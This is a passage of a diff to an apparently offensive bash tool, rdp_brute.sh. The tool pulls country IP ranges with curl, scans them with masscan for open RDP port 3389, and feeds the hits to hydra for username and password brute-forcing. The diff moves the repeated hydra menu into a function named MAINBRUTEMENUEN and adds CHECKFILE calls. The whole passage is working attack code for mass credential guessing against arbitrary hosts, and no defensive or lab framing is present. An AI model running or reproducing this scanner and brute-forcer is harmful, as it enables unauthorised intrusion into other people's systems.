 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -30067,53 +11967,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "197" ]; then
@@ -30130,6 +11984,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -30139,53 +11994,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "198" ]; then
@@ -30202,6 +12011,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -30211,53 +12021,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "199" ]; then
@@ -30274,6 +12038,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -30283,53 +12048,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -30347,6 +12066,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -30356,53 +12076,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "201" ]; then
@@ -30419,6 +12093,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -30428,53 +12103,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -30492,6 +12121,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -30501,53 +12131,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -30565,6 +12149,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -30575,52 +12160,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
+MAINBRUTEMENUEN
 else
 if [ "$country" = "204" ]; then
 curl http://ipdiapazon.16mb.com/Zimbabwe.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
@@ -30636,6 +12176,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
